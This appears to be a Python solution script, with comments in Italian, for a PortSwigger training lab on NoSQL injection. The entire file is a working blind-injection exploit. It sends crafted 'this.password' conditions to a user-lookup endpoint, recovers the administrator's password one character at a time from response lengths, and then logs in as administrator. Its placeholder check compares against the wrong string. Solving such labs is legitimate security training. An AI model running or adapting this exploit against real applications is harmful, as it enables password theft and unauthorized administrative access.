"""
    RISOLUZIONE DEL LAB: https://portswigger.net/web-security/nosql-injection/lab-nosql-injection-extract-data
"""
import requests
import sys

try:
    from colorama import init, Fore, Style
    init(autoreset=True)
except Exception:
    class Fore:
        RED = ''
        GREEN = ''
        YELLOW = ''
        BLUE = ''
        CYAN = ''
        MAGENTA = ''
    class Style:
        RESET_ALL = ''

def colored(text, color):
    return f"{color}{text}{Style.RESET_ALL}"

def print_error(msg):
    print(colored(msg, Fore.RED))

def print_success(msg):
    print(colored(msg, Fore.GREEN))

def print_info(msg):
    print(colored(msg, Fore.CYAN))

LAB_ID = "INSERT_YOUR_LAB_ID_HERE"  
BASE_URL = f"https://{LAB_ID}.web-security-academy.net"

class NoSQLInjectionExploit:
    def __init__(self, lab_id):
        self.lab_id = lab_id
        self.base_url = f"https://{lab_id}.web-security-academy.net"
        self.session = requests.Session()
        self.password = ""
        
    def check_lab_status(self):
        try:
            response = self.session.get(self.base_url, timeout=10)
            if response.status_code == 200:
                print_success(f"Lab raggiungibile: {self.base_url}")
                return True
            else:
                print_error(f"Lab non raggiungibile (Status: {response.status_code})")
                return False
        except Exception as e:
            print_error(f"Errore connessione: {e}")
            return False
    
    def login(self, username="wiener", password="peter"):
        """Effettua il login per ottenere una sessione valida"""
        print_info(f"\nLogin con {username}:{password}")
        
        #prima otteniamo il token CSRF dalla pagina di login
        login_page = self.session.get(f"{self.base_url}/login", timeout=10)
        
        #estrai il CSRF token dalla pagina
        import re
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
        csrf_token = csrf_match.group(1) if csrf_match else ""
        
        login_data = {
            "csrf": csrf_token,
            "username": username,
            "password": password
        }
        
        response = self.session.post(
            f"{self.base_url}/login",
            data=login_data,
            allow_redirects=True,
            timeout=10
        )
        
        if response.status_code == 200 and "Your username is:" in response.text:
            print_success(f"Login effettuato con successo!")
            return True
        else:
            print_error(f"Login fallito")
            return False
    
    def check_password_length(self, username="administrator"):
        """Determina la lunghezza della password"""
        print_info(f"\nRicerca lunghezza password per {username}")

        ranges = [(1, 10), (10, 20), (20, 30), (30, 40)]
        
        for range_start, range_end in ranges:
            #controlla se la lunghezza è minore del limite superiore
            payload = f"{username}' & this.password.length < {range_end} || 'a'=='b"
            
            params = {"user": payload}
            response = self.session.get(
                f"{self.base_url}/user/lookup",
                params=params,
                timeout=10
            )
            
            #se content length > 38, la lunghezza è minore di range_end (ha dato risposta sbagliata -> visto da zaproxy)
            if response.status_code == 200 and len(response.text) > 38:
                print_info(f"Lunghezza password < {range_end}, ricerca in range {range_start}-{range_end-1}")
                
                #prova dal più alto al più basso in questo range (9,8...1)
                for length in range(range_end - 1, range_start - 1, -1):
                    payload = f"{username}' & this.password.length == {length} || 'a'=='b"
                    
                    params = {"user": payload}
                    response = self.session.get(
                        f"{self.base_url}/user/lookup",
                        params=params,
                        timeout=10
                    )
                    
                    if response.status_code == 200 and len(response.text) > 38:
                        print_success(f"Lunghezza password trovata: {length}")
                        return length
        
        print_error("Impossibile determinare la lunghezza della password")
        return None
    
    def extract_password(self, username="administrator", length=None):
        """Estrae la password carattere per carattere"""
        if length is None:
            length = self.check_password_length(username)
            if length is None:
                return None
        
        print_info(f"\nEstrazione password per {username} (lunghezza: {length})")
        
        password = ""
        charset = "abcdefghijklmnopqrstuvwxyz"
        
        for position in range(length):
            found = False
            print_info(f"\nRicerca carattere in posizione {position}")
            
            for char in charset:
                payload = f"{username}' & this.password[{position}] == '{char}' || 'a'=='b"
                
                params = {"user": payload}
                response = self.session.get(
                    f"{self.base_url}/user/lookup",
                    params=params,
                    timeout=10
                )
                
                # Se content length > 38, la condizione è vera (carattere corretto) (visto da zaproxy)
                if response.status_code == 200 and len(response.text) > 38:
                    password += char
                    print_success(f"Carattere trovato: {char} -> Password parziale: {password}")
                    found = True
                    break
            
            if not found:
                print_error(f"Carattere in posizione {position} non trovato")
                return None
        
        print_success(f"\nPASSWORD COMPLETA ESTRATTA: {password}")
        return password
    
    def solve_lab(self, extracted_password):
        """Effettua il login come administrator per completare il lab"""
        print_info(f"\nLogin come administrator con password: {extracted_password}")
        
        # Ottieni nuovo CSRF token
        login_page = self.session.get(f"{self.base_url}/login", timeout=10)
        import re
        csrf_match = re.search(r'name="csrf" value="([^"]+)"', login_page.text)
        csrf_token = csrf_match.group(1) if csrf_match else ""
        
        login_data = {
            "csrf": csrf_token,
            "username": "administrator",
            "password": extracted_password
        }
        
        response = self.session.post(
            f"{self.base_url}/login",
            data=login_data,
            allow_redirects=True,
            timeout=10
        )
        
        if response.status_code == 200 and "administrator" in response.text.lower():
            print_success(f"Login come administrator riuscito!")
            print_success(f"Lab completato!")
            return True
        else:
            print_error(f"Login come administrator fallito")
            return False
   
def main():
    if LAB_ID == "YOUR_LAB_ID_HERE":
        print_error("\nERRORE: Devi impostare il LAB_ID nello script!")
        print_info("Esempio: LAB_ID = '0a12003404bd3fe180f562b700ab0012'")
        sys.exit(1)
    
    exploit = NoSQLInjectionExploit(LAB_ID)
    
    if not exploit.check_lab_status():
        sys.exit(1)
    
    #1: Login come wiener per ottenere una sessione valida
    if not exploit.login("wiener", "peter"):
        print_error("Impossibile effettuare il login")
        sys.exit(1)
    #2: Estrai la password dell'administrator
    password = exploit.extract_password("administrator")
    
    if password:
        #3: Login come administrator per completare il lab
        exploit.solve_lab(password)
    else:
        print_error("Impossibile estrarre la password")
        sys.exit(1)


if __name__ == "__main__":
    main()